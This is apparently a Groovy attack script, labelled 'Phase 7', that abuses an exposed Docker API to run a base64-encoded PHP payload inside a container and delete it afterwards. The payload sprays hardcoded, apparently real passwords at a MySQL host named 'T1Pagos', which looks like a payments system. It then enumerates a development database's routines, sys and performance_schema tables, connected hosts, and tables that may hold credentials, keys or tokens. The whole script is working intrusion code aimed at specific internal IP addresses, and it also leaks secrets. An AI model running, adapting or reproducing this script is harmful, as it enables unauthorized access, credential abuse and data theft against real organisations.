// Phase 7: T1Pagos auth retry + stored procs + tables enum + pivot paths
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

// =====================================================
// PART 1: T1Pagos with correct password + variations
// =====================================================
echo "===== T1PAGOS AUTH SPRAY (172.27.141.4:3306) =====\\n";
$t1_creds = array(
    array("app_t1", "wUt22Us2CUh#+M="),
    array("apifincadodev", "1q2w3e4r5t6y"),
    array("apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("adaxxidb", "JTQ6PrkecY3y1kVN"),
    array("root", "1q2w3e4r5t6y"),
    array("root", ""),
    array("app_t1", "1q2w3e4r5t6y"),
    array("t1pagos", "wUt22Us2CUh#+M="),
    array("payment", "wUt22Us2CUh#+M="),
);
foreach ($t1_creds as $c) {
    list($user, $pass) = $c;
    $m = @new mysqli("172.27.141.4", $user, $pass, "", 3306);
    if (!$m->connect_error) {
        echo "*** T1_AUTH_OK *** $user\\n";
        $r = $m->query("SELECT VERSION(), CURRENT_USER(), @@hostname");
        $row = $r->fetch_row();
        echo "  VER=$row[0] CU=$row[1] HN=$row[2]\\n";
        $r = $m->query("SHOW DATABASES"); while ($row = $r->fetch_row()) { echo "  DB: $row[0]\\n"; }
        $r = $m->query("SHOW GRANTS FOR CURRENT_USER()"); while ($row = $r->fetch_row()) { echo "  GRANT: $row[0]\\n"; }
        $m->close();
        break;
    } else {
        $msg = $m->connect_error;
        if (strpos($msg, "Access denied") !== false) {
            echo "DENY|$user\\n";
        } else {
            echo "ERR|$user|$msg\\n";
            break;
        }
    }
}

// =====================================================
// PART 2: DEV Sears - stored procedures and functions
// =====================================================
echo "\\n===== DEV SEARS: STORED PROCS / FUNCTIONS =====\\n";
$m = new mysqli("172.27.141.6", "apifincadodev", "1q2w3e4r5t6y", "tienda", 3308);
if ($m->connect_error) { echo "DEV_FAIL\\n"; exit; }

// List all routines accessible
$r = $m->query("SELECT ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE, SECURITY_TYPE, DEFINER FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA IN ('tienda','tienda_nueva','admonplaza','contadores_pot','mysql','sys') ORDER BY ROUTINE_SCHEMA, ROUTINE_NAME LIMIT 100");
if ($r) {
    echo "Count: ".$r->num_rows."\\n";
    while ($row = $r->fetch_assoc()) {
        echo "  ".$row["ROUTINE_SCHEMA"].".".$row["ROUTINE_NAME"]." (".$row["ROUTINE_TYPE"].") DEFINER=".$row["DEFINER"]." SECURITY=".$row["SECURITY_TYPE"]."\\n";
    }
} else { echo "ERR: ".$m->error."\\n"; }

// =====================================================
// PART 3: sys schema (privilege escalation paths)
// =====================================================
echo "\\n===== SYS SCHEMA EXPLOITATION =====\\n";
// sys.version
$r = $m->query("SELECT * FROM sys.version");
if ($r) { $row = $r->fetch_assoc(); echo "sys.version: ".implode("|",$row)."\\n"; }

// sys.host_summary (connections info)
$r = $m->query("SELECT * FROM sys.host_summary LIMIT 10");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  HOST_SUM: ".$row["host"]." conns=".$row["total_connections"]."\\n"; } }
else { echo "host_summary: ".$m->error."\\n"; }

// sys.processlist
$r = $m->query("SELECT * FROM sys.processlist LIMIT 20");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  PROC: pid=".$row["thd_id"]." user=".$row["user"]." host=".$row["conn_id"]." db=".$row["db"]." cmd=".$row["command"]." stmt=".substr($row["current_statement"]??"",0,80)."\\n"; } }
else { echo "processlist: ".$m->error."\\n"; }

// sys.user_summary
$r = $m->query("SELECT * FROM sys.user_summary");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  USER_SUM: ".$row["user"]." stmts=".$row["statements"]." conn=".$row["total_connections"]."\\n"; } }
else { echo "user_summary: ".$m->error."\\n"; }

// =====================================================
// PART 4: performance_schema for network/host intel
// =====================================================
echo "\\n===== PERFORMANCE_SCHEMA: ACCOUNTS + HOSTS =====\\n";
$r = $m->query("SELECT * FROM performance_schema.accounts WHERE USER IS NOT NULL ORDER BY CURRENT_CONNECTIONS DESC LIMIT 20");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  ACCOUNT: ".$row["USER"]."@".$row["HOST"]." curr=".$row["CURRENT_CONNECTIONS"]." total=".$row["TOTAL_CONNECTIONS"]."\\n"; } }
else { echo "perf accounts: ".$m->error."\\n"; }

$r = $m->query("SELECT * FROM performance_schema.hosts WHERE HOST IS NOT NULL ORDER BY CURRENT_CONNECTIONS DESC LIMIT 20");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  HOST: ".$row["HOST"]." curr=".$row["CURRENT_CONNECTIONS"]." total=".$row["TOTAL_CONNECTIONS"]."\\n"; } }
else { echo "perf hosts: ".$m->error."\\n"; }

// =====================================================
// PART 5: Interesting tables (configs, creds, keys)
// =====================================================
echo "\\n===== TABLES WITH CREDS/CONFIGS =====\\n";
$r = $m->query("SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA IN ('tienda','tienda_nueva','admonplaza') AND (TABLE_NAME LIKE '%config%' OR TABLE_NAME LIKE '%credential%' OR TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%key%' OR TABLE_NAME LIKE '%token%' OR TABLE_NAME LIKE '%secret%' OR TABLE_NAME LIKE '%api%' OR TABLE_NAME LIKE '%connection%' OR TABLE_NAME LIKE '%setting%' OR TABLE_NAME LIKE '%payment%') ORDER BY TABLE_SCHEMA, TABLE_NAME");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  ".$row["TABLE_SCHEMA"].".".$row["TABLE_NAME"]."\\n"; } }

// =====================================================
// PART 6: Check test DB
// =====================================================
echo "\\n===== TEST DATABASE =====\\n";
$r = $m->query("SHOW TABLES FROM test");
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_row()) { echo "  test.".$row[0]."\\n"; } }
else { echo "test DB empty or no access: ".$m->error."\\n"; }

// Check reporte_directivo
echo "\\n===== REPORTE_DIRECTIVO DB =====\\n";
$r = $m->query("SHOW TABLES FROM reporte_directivo");
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_row()) { echo "  ".$row[0]."\\n"; } }
else { echo "reporte_directivo: ".$m->error."\\n"; }

$m->close();
echo "\\nPHASE7_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p7.php && php /tmp/_p7.php 2>&1; rm -f /tmp/_p7.php"

println "########## PHASE 7: STORED PROCS + T1 AUTH + ENUM ##########"
println execIn(cmd)
